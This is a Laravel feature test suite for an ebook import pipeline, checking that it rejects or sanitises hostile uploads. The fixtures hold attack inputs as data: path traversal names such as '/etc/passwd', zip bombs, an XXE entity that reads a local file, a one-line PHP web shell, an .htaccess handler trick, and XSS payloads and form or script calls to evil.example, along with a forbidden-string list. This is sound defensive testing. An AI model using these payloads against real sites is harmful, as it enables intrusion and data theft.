<?php

namespace Tests\Feature;

use App\Modules\Catalog\Models\EditionFile;
use App\Modules\Imports\ImportRejected;
use App\Modules\Imports\Services\ImportPipeline;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Tests\TestCase;
use ZipArchive;

class ImportSecurityTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        $this->setUpLibrary();
    }

    /** Builds a valid EPUB and then lets the callback damage the archive. */
    private function tamperedEpub(callable $tamper, array $overrides = []): UploadedFile
    {
        $upload = $this->epubUpload($overrides);
        $zip = new ZipArchive;
        $zip->open($upload->getRealPath());
        $tamper($zip);
        $zip->close();

        return new UploadedFile($upload->getRealPath(), 'book.epub', 'application/epub+zip', null, true);
    }

    private function assertImportFails(UploadedFile $upload, string $expectedMessage): void
    {
        $edition = $this->draftEdition();
        $job = $this->import($edition, $upload);

        $this->assertSame('failed', $job->status, 'The import should have been rejected.');
        $this->assertStringContainsStringIgnoringCase($expectedMessage, (string) $job->error);

        $file = $job->file;
        $this->assertSame('failed', $file->import_status);
        $this->assertFalse($file->is_current);
        $this->assertNull($file->reading_path);

        // Nothing is left behind and nothing became reachable.
        $this->assertSame([], Storage::disk('library')->allFiles('quarantine'));
        $this->assertSame([], Storage::disk('library')->allFiles("reading/{$file->id}-v{$file->version}"));
        $this->assertSame([], Storage::disk('library')->allFiles('tmp'));
        $this->assertSame('draft', $edition->fresh()->status);
        $this->assertNotEmpty($edition->fresh()->publicationBlockers());
        $this->get("/download/{$file->id}")->assertNotFound();
        $this->get("/content/{$file->id}/{$file->contentKey()}/OEBPS/chapter-1.xhtml")->assertNotFound();
    }

    public function test_path_traversal_entries_are_rejected(): void
    {
        foreach (['../../evil.php', 'OEBPS/../../../evil.xhtml', '/etc/passwd', 'C:/Windows/evil.txt', 'OEBPS\\..\\evil.xhtml'] as $name) {
            $this->assertImportFails($this->tamperedEpub(fn (ZipArchive $zip) => $zip->addFromString($name, 'x')), 'unsafe entry path');
        }
    }

    public function test_symbolic_links_are_rejected(): void
    {
        $upload = $this->tamperedEpub(function (ZipArchive $zip) {
            $zip->addFromString('OEBPS/link.xhtml', '/etc/passwd');
            // Unix mode 0120777 = symbolic link, stored in the high 16 bits.
            $zip->setExternalAttributesName('OEBPS/link.xhtml', ZipArchive::OPSYS_UNIX, 0120777 << 16);
        });

        $this->assertImportFails($upload, 'symbolic link');
    }

    public function test_archives_over_the_limits_are_rejected(): void
    {
        config(['library.imports.zip_max_entries' => 10]);
        $this->assertImportFails($this->tamperedEpub(function (ZipArchive $zip) {
            for ($i = 0; $i < 20; $i++) {
                $zip->addFromString("OEBPS/extra-$i.txt", 'x');
            }
        }), 'too many entries');

        config(['library.imports.zip_max_entries' => 5000, 'library.imports.zip_max_expanded_bytes' => 200_000]);
        $this->assertImportFails($this->tamperedEpub(fn (ZipArchive $zip) => $zip->addFromString('OEBPS/big.bin', random_bytes(300_000))), 'expands to more');

        config(['library.imports.zip_max_expanded_bytes' => 512 * 1048576, 'library.imports.zip_max_entry_bytes' => 100_000]);
        $this->assertImportFails($this->tamperedEpub(fn (ZipArchive $zip) => $zip->addFromString('OEBPS/big.bin', random_bytes(150_000))), 'larger than allowed');
    }

    public function test_compression_bombs_are_rejected(): void
    {
        // 30 MB of zeros compresses to a few kilobytes: a ratio in the thousands.
        $upload = $this->tamperedEpub(fn (ZipArchive $zip) => $zip->addFromString('OEBPS/bomb.bin', str_repeat("\0", 30 * 1048576)));

        $this->assertImportFails($upload, 'compression ratio');
    }

    public function test_upload_size_limit_is_enforced_before_anything_is_stored(): void
    {
        config(['library.imports.max_upload_bytes' => 100]);

        $this->expectException(ImportRejected::class);
        app(ImportPipeline::class)->intake($this->epubUpload(), $this->draftEdition(), null);
    }

    public function test_files_that_are_not_what_their_extension_claims_are_rejected(): void
    {
        $path = $this->temporaryPath('epub');
        file_put_contents($path, '<?php echo "not an epub";');
        try {
            app(ImportPipeline::class)->intake(new UploadedFile($path, 'shell.epub', null, null, true), $this->draftEdition(), null);
            $this->fail('A PHP file renamed to .epub was accepted.');
        } catch (ImportRejected $e) {
            $this->assertStringContainsString('does not match its extension', $e->getMessage());
        }

        $path = $this->temporaryPath('php');
        file_put_contents($path, '<?php');
        try {
            app(ImportPipeline::class)->intake(new UploadedFile($path, 'shell.php', null, null, true), $this->draftEdition(), null);
            $this->fail('A .php upload was accepted.');
        } catch (ImportRejected $e) {
            $this->assertStringContainsString('Only EPUB, PDF, TXT and HTML', $e->getMessage());
        }

        $this->assertSame(0, EditionFile::count());
        $this->assertSame([], Storage::disk('library')->allFiles());
    }

    public function test_malformed_archives_and_packages_fail_cleanly(): void
    {
        // A ZIP that is not an EPUB.
        $path = $this->temporaryPath('epub');
        $zip = new ZipArchive;
        $zip->open($path, ZipArchive::CREATE);
        $zip->addFromString('readme.txt', 'hello');
        $zip->close();
        $this->assertImportFails(new UploadedFile($path, 'plain.epub', null, null, true), 'mimetype');

        // Truncated archive.
        $good = $this->epubUpload();
        $broken = $this->temporaryPath('epub');
        file_put_contents($broken, substr(file_get_contents($good->getRealPath()), 0, 600));
        $this->assertImportFails(new UploadedFile($broken, 'broken.epub', null, null, true), 'not a readable ZIP');

        // Package document that is not XML.
        $this->assertImportFails($this->tamperedEpub(fn (ZipArchive $zip) => $zip->addFromString('OEBPS/content.opf', '<package><unclosed>')), 'package document');

        // Container pointing at a missing package.
        $this->assertImportFails($this->tamperedEpub(fn (ZipArchive $zip) => $zip->deleteName('OEBPS/content.opf')), 'not found');
    }

    public function test_drm_encrypted_and_password_protected_files_are_refused(): void
    {
        $encryption = '<?xml version="1.0"?><encryption xmlns="urn:oasis:names:tc:opendocument:xmlns:container" xmlns:enc="http://www.w3.org/2001/04/xmlenc#">'
            .'<enc:EncryptedData><enc:EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#aes256-cbc"/>'
            .'<enc:CipherData><enc:CipherReference URI="OEBPS/chapter-1.xhtml"/></enc:CipherData></enc:EncryptedData></encryption>';
        $this->assertImportFails($this->tamperedEpub(fn (ZipArchive $zip) => $zip->addFromString('META-INF/encryption.xml', $encryption)), 'DRM');

        $pdf = $this->pdfUpload();
        file_put_contents($pdf->getRealPath(), str_replace('/Root 1 0 R', '/Root 1 0 R /Encrypt 9 0 R', file_get_contents($pdf->getRealPath())));
        $this->assertImportFails(new UploadedFile($pdf->getRealPath(), 'locked.pdf', null, null, true), 'encrypted');
    }

    public function test_xml_external_entities_are_never_expanded(): void
    {
        $secret = $this->temporaryPath('txt');
        file_put_contents($secret, 'TOP-SECRET-CONTENT');
        $uri = 'file:///'.str_replace('\\', '/', $secret);

        $chapter = '<?xml version="1.0"?><!DOCTYPE html [<!ENTITY xxe SYSTEM "'.$uri.'">]>'
            .'<html xmlns="http://www.w3.org/1999/xhtml"><head><title>x</title></head><body><p>Before &xxe; after</p></body></html>';

        $edition = $this->draftEdition();
        $job = $this->import($edition, $this->tamperedEpub(fn (ZipArchive $zip) => $zip->addFromString('OEBPS/chapter-1.xhtml', $chapter)));

        // Either outcome is safe: rejected outright, or imported with the entity left unexpanded.
        if ($job->status === 'review') {
            $stored = Storage::disk('library')->get($job->file->reading_path.'/OEBPS/chapter-1.xhtml');
            $this->assertStringNotContainsString('TOP-SECRET-CONTENT', $stored);
        } else {
            $this->assertSame('failed', $job->status);
        }
        foreach (Storage::disk('library')->allFiles() as $path) {
            $this->assertStringNotContainsString('TOP-SECRET-CONTENT', Storage::disk('library')->get($path));
        }
    }

    public function test_active_content_is_removed_from_the_reading_copy_but_the_download_is_untouched(): void
    {
        $hostile = '<p onclick="steal()" style="color: red; background: url(https://tracker.example/pixel.gif)">Visible text</p>'
            .'<script>window.parent.document.cookie</script>'
            .'<script src="https://evil.example/x.js"></script>'
            .'<iframe src="https://evil.example/frame"></iframe>'
            .'<object data="evil.swf"></object><embed src="evil.swf"/>'
            .'<form action="https://evil.example/collect"><input name="password"/><button>Send</button></form>'
            .'<a href="javascript:alert(1)">js link</a>'
            .'<a href="JaVa&#9;ScRiPt:alert(2)">obfuscated link</a>'
            .'<a href="data:text/html,&lt;script&gt;alert(3)&lt;/script&gt;">data link</a>'
            .'<a href="https://example.org/fine">outside link</a>'
            .'<a href="chapter-2.xhtml#top">inside link</a>'
            .'<img src="https://tracker.example/beacon.png" alt="tracking pixel"/>'
            .'<img src="//tracker.example/beacon2.png" alt="protocol relative"/>'
            .'<img src="cover.png" onerror="alert(4)" alt="local image"/>'
            .'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(5)</script><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(6)"><text>svg</text></a><foreignObject><body>fo</body></foreignObject></svg>'
            .'<meta http-equiv="refresh" content="0;url=https://evil.example"/>'
            .'<link rel="stylesheet" href="https://evil.example/remote.css"/>'
            .'<base href="https://evil.example/"/>'
            .'<video src="https://evil.example/v.mp4" autoplay="autoplay"></video>'
            .'<style>@import url("https://evil.example/a.css"); p { background: url(https://tracker.example/b.gif); behavior: url(x.htc); width: expression(alert(7)); }</style>';

        $css = "@import 'https://evil.example/remote.css';\nbody { background: url('http://tracker.example/c.gif'); }\n"
            .".ok { background: url(\"images/local.png\"); color: #123; }\n.x { -moz-binding: url(x.xml#y); }";

        $upload = $this->tamperedEpub(
            fn (ZipArchive $zip) => $zip->addFromString('OEBPS/style.css', $css),
            ['chapters' => [['title' => 'Hostile', 'html' => $hostile], ['title' => 'Two', 'html' => '<p id="top">Second</p>']]]
        );
        $originalHash = hash_file('sha256', $upload->getRealPath());

        $edition = $this->draftEdition();
        $job = $this->import($edition, $upload);
        $this->assertSame('review', $job->status, (string) $job->error);
        $file = $job->file;

        $chapter = Storage::disk('library')->get($file->reading_path.'/OEBPS/chapter-1.xhtml');
        $lower = strtolower($chapter);

        foreach (['<script', '<iframe', '<object', '<embed', '<form', '<input', '<button', '<base', '<video', '<foreignobject',
            'onclick', 'onerror', 'javascript:', 'data:text/html', 'evil.example', 'tracker.example', 'http-equiv', 'expression(', 'behavior', '@import'] as $forbidden) {
            $this->assertStringNotContainsString($forbidden, $lower, "Reading copy still contains: $forbidden");
        }

        // Legitimate content survives.
        $this->assertStringContainsString('Visible text', $chapter);
        $this->assertStringContainsString('href="https://example.org/fine"', $chapter);
        $this->assertStringContainsString('rel="noopener noreferrer external"', $chapter);
        $this->assertStringContainsString('href="chapter-2.xhtml#top"', $chapter);
        $this->assertStringContainsString('src="cover.png"', $chapter);
        $this->assertStringContainsString('href="style.css"', $chapter);

        $storedCss = strtolower(Storage::disk('library')->get($file->reading_path.'/OEBPS/style.css'));
        foreach (['evil.example', 'tracker.example', '@import', '-moz-binding'] as $forbidden) {
            $this->assertStringNotContainsString($forbidden, $storedCss);
        }
        $this->assertStringContainsString('images/local.png', $storedCss);

        // The editor is told what was changed.
        $this->assertNotEmpty($file->validation_report['notes']);

        // The file offered for download is byte-for-byte what was uploaded.
        $this->assertSame($originalHash, hash('sha256', Storage::disk('library')->get($file->storage_path)));
        $this->assertSame($originalHash, $file->sha256);
    }

    public function test_only_allow_listed_resource_types_reach_the_reading_copy(): void
    {
        $upload = $this->tamperedEpub(function (ZipArchive $zip) {
            $zip->addFromString('OEBPS/app.js', 'alert(1)');
            $zip->addFromString('OEBPS/.htaccess', 'AddHandler php-script .xhtml');
            $zip->addFromString('OEBPS/shell.php', '<?php system($_GET["c"]);');
            $zip->addFromString('OEBPS/fake.png', '<?php not an image');
        }, ['manifestExtra' => '<item id="js" href="app.js" media-type="application/javascript"/>'
            .'<item id="php" href="shell.php" media-type="application/xhtml+xml"/>']);

        $job = $this->import($this->draftEdition(), $upload);
        $this->assertSame('review', $job->status, (string) $job->error);

        $stored = Storage::disk('library')->allFiles($job->file->reading_path);
        foreach ($stored as $path) {
            $this->assertMatchesRegularExpression('/\.(xhtml|css|opf|xml)$/', $path);
        }
        $this->assertStringNotContainsString('shell.php', implode(' ', $stored));

        // A manifest item whose bytes are not the image they claim to be fails the import.
        $bad = $this->tamperedEpub(
            fn (ZipArchive $zip) => $zip->addFromString('OEBPS/fake.png', '<?php not an image'),
            ['manifestExtra' => '<item id="img" href="fake.png" media-type="image/png"/>']
        );
        $this->assertImportFails($bad, 'does not match its declared type');
    }

    public function test_identical_files_are_detected_as_duplicates(): void
    {
        $upload = $this->epubUpload();
        $pipeline = app(ImportPipeline::class);
        $pipeline->intake($upload, $this->draftEdition(['title' => 'First Home']), null);

        try {
            $pipeline->intake(new UploadedFile($upload->getRealPath(), 'again.epub', null, null, true), $this->draftEdition(), null);
            $this->fail('The duplicate was not detected.');
        } catch (ImportRejected $e) {
            $this->assertStringContainsString('already stored for "First Home"', $e->getMessage());
        }

        // An editor may store it again on purpose.
        $job = $pipeline->intake(new UploadedFile($upload->getRealPath(), 'again.epub', null, null, true), $this->draftEdition(), null, allowDuplicate: true);
        $this->assertSame('review', $job->refresh()->status);
    }

    public function test_fixed_layout_and_pdf_details_are_recorded_for_editors(): void
    {
        $fixed = $this->import($this->draftEdition(), $this->epubUpload(['layout' => 'fixed']));
        $this->assertSame('fixed', $fixed->file->layout);
        $this->assertStringContainsString('fixed-layout', implode(' ', $fixed->file->validation_report['warnings']));

        $pdf = $this->import($this->draftEdition(), $this->pdfUpload());
        $this->assertSame('review', $pdf->status);
        $this->assertSame(2, $pdf->file->page_count);
        $this->assertNull($pdf->file->has_text_layer, 'Whether a PDF is a scan is recorded by an editor, never guessed.');
        $this->assertSame('Test PDF', $pdf->extracted_metadata['title']);
    }
}
